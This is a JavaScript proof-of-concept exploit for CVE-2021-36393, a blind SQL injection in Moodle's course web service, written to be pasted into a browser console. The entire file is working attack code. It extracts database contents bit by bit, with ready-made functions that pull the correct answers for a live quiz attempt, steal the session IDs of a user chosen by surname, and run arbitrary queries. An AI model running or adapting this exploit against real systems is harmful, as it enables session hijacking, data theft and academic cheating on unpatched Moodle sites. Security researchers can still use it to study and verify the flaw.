// CVE-2021-36393 PoC in JavaScript (just copy that into browser console)
// Moodle versions affected: 3.11, 3.10 to 3.10.4, 3.9 to 3.9.7 and earlier unsupported versions
// useful links:
// - https://security.snyk.io/vuln/SNYK-PHP-MOODLEMOODLE-3356636
// - https://moodle.org/mod/forum/discuss.php?d=424798
// - https://github.com/moodle/moodle/commit/68c90578e7a13cfa188bc07a9ce6fe02f9444d01
// - https://web.archive.org/web/20220201200500/https://0xkasper.com/articles/moodle-sql-injection-broken-access-control.html

function buildUrl() {
	const params = new URLSearchParams({
		sesskey: M.cfg.sesskey,
		info: "core_course_get_recent_courses",
	});

	return `${window.location.origin}/lib/ajax/service.php?${params}`;
}

function buildData(condition) {
	return JSON.stringify([
		{
			index: 0,
			methodname: "core_course_get_recent_courses",
			args: {
				sort: `IF((${condition}), timeaccess AND CAST(POW(2, 63) as UNSIGNED), timeaccess)`,
				limit: 0,
				offset: 1,
			},
		},
	]);
}

async function estimateResultLength(query, maxLength) {
	let lo = 0;
	let hi = maxLength;

	while (lo <= hi) {
		let mid = Math.floor((lo + hi) / 2);

		const response = await fetch(buildUrl(), {
			method: "POST",
			body: buildData(`(SELECT ${mid} = LENGTH((${query})))`),
			credentials: "same-origin",
		});
		const json = await response.json();

		if (json[0].error === true) { //mid == item
			return mid;
		} else {
			const response = await fetch(buildUrl(), {
				method: "POST",
				body: buildData(`(SELECT ${mid} < LENGTH((${query})))`),
				credentials: "same-origin",
			});
			const json = await response.json();

			if (json[0].error === true) { //mid < item
				lo = mid + 1;
			} else if (json[0].error === false) { //mid > item
				hi = mid - 1;
			}
		}
	}

	return null;
}

async function executeQuery(query, maxLength = 512) {
	let bytes = [];
	const length = await estimateResultLength(query, maxLength);
	console.log(`length of '${query}' = ${length}`);
	for (let i = 0; i < length; i++) {
		let byte = 0;
		for (let bit_pos = 0; bit_pos < 8; bit_pos++) {
			const byte_pos = 1 + 2 * i;
			const response = await fetch(buildUrl(), {
				method: "POST",
				body: buildData(`(SELECT ((ORD(UNHEX(SUBSTRING(HEX((${query})), ${byte_pos}, 2))) >> ${bit_pos}) & 1) = 1)`),
				credentials: "same-origin",
			});

			const json = await response.json();
			if (json[0].error === true) {
				byte |= 1 << bit_pos;
			}
		}
		bytes.push(byte);
	}
	return new TextDecoder("utf-8").decode(new Uint8Array(bytes));
}

async function getAnswers() {
	if (window.location.pathname.includes("attempt.php")) {
		const urlParams = new URLSearchParams(window.location.search);

		const attempt = parseInt(urlParams.get("attempt"));
		const cmid = parseInt(urlParams.get("cmid"));
		const page = parseInt(urlParams.get("page") ?? "0");

		const buttons = document.getElementsByClassName("qn_buttons")[0];
		const slots = [...buttons.childNodes].map(element => parseInt(element.id.replace("quiznavbutton", "")));
		const slot = slots[page];

		console.time("query1");
		const result = await executeQuery(`SELECT rightanswer FROM mdl_question_attempts WHERE slot = ${slot} AND questionusageid = (SELECT uniqueid FROM mdl_quiz_attempts WHERE id = ${attempt} AND quiz = (SELECT id FROM mdl_quiz WHERE id = (SELECT instance FROM mdl_course_modules WHERE id = ${cmid} AND module = (SELECT id FROM mdl_modules WHERE name = 'quiz'))))`);
		console.timeEnd("query1");
		console.log(result);
	}
}

async function stealMoodleSession(lastname) {
	const userId = parseInt(await executeQuery(`SELECT CONCAT(id) FROM mdl_user WHERE lastname = '${lastname}'`));
	const countOfSessions = parseInt(await executeQuery(`SELECT CONCAT(COUNT(*)) FROM mdl_sessions WHERE userid = ${userId}`));

	console.log(`user profile: ${window.location.origin}/user/profile.php?id=${userId}`);
	console.log(`count of sessions: ${countOfSessions}`);

	for (let i = 0; i < countOfSessions; i++) {
		const session = await executeQuery(`SELECT sid FROM mdl_sessions WHERE userid = ${userId} ORDER BY id DESC LIMIT 1 OFFSET ${i}`);
		console.log(`session #${i}: ${session}`);
	}
}

// if you want to steal cookie by lastname
await stealMoodleSession("Jones");

// if you want to get answers:
await getAnswers();

// if you want to execute query:
console.time("query1");
console.log(await executeQuery("select version()"));
console.timeEnd("query1");
